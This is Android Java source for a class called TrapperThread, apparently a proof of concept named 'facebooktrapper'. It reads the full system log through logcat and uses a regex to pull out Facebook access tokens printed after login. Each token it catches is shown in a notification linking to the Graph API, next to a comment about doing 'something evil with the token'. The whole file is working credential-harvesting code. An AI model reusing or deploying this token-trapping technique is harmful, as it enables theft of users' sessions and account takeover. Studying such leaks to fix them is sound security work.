package com.pixplicity.example.facebooktrapper;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;

public class TrapperThread extends Thread {

	final Activity mActivity;

	public TrapperThread(Activity activity) {
		mActivity = activity;
	}

	public void doInBackground(ListView list,
			final ArrayAdapter<String> adapter) {
		// Clear the list
		list.post(new Runnable() {
			@Override
			public void run() {
				adapter.clear();
			}
		});
		Process process = null;
		BufferedReader reader = null;
		Pattern pattern = Pattern
				.compile("Login Success! access_token=([^\\s]+)");
		try {
			process = Runtime.getRuntime().exec(new String[] { "logcat",
					"*:V" });
			// Read the process stream
			reader = new BufferedReader(new InputStreamReader(
					process.getInputStream()),
					1024);
			int count = 0;
			while (true) {
				final String line = reader.readLine();
				if (line == null) {
					break;
				}
				// Update the list
				list.post(new Runnable() {
					@Override
					public void run() {
						while (adapter.getCount() > TrapperActivity.MAX_ITEMS - 10) {
							adapter.remove(adapter.getItem(0));
						}
						adapter.add(line);
					}
				});
				Matcher match = pattern.matcher(line);
				if (match.find()) {
					String token = match.group(1);
					showNotification(++count, "Token trapped!", token);
					// TODO Do something evil with the token
				}
				// Short delay to prevent locking up
				Thread.sleep(10);
			}
		} catch (IOException e) {
			showToast(e.getMessage());
		} catch (InterruptedException e) {
			// Stop thread
		} finally {
			if (process != null) {
				process.destroy();
			}
			if (reader != null) {
				try {
					reader.close();
				} catch (IOException e) {
				}
			}
		}
	}

	private void showToast(final String string) {
		mActivity.runOnUiThread(new Runnable() {
			@Override
			public void run() {
				Toast.makeText(mActivity, string, Toast.LENGTH_SHORT).show();
			}
		});
	}

	protected void showNotification(int id, String title, String token) {
		NotificationManager ns = (NotificationManager) mActivity
				.getSystemService(Context.NOTIFICATION_SERVICE);
		Notification notification = new Notification(
				R.drawable.ic_launcher, title,
				System.currentTimeMillis());
		boolean cancel = false;
		if (id < 0) {
			id = 0;
			cancel = true;
		}
		final Intent intent;
		if (id == 0) {
			intent = new Intent(mActivity, TrapperActivity.class);
			notification.flags |= Notification.FLAG_ONGOING_EVENT;
		} else {
			intent = new Intent(Intent.ACTION_VIEW,
						Uri.parse("https://graph.facebook.com/me?access_token="
								+ token));
		}
		PendingIntent contentIntent = PendingIntent
				.getActivity(mActivity, 0,
						intent, 0);
		notification.setLatestEventInfo(mActivity,
				title, token, contentIntent);
		ns.notify(id, notification);
		if (cancel) {
			ns.cancel(id);
		}
	}

}
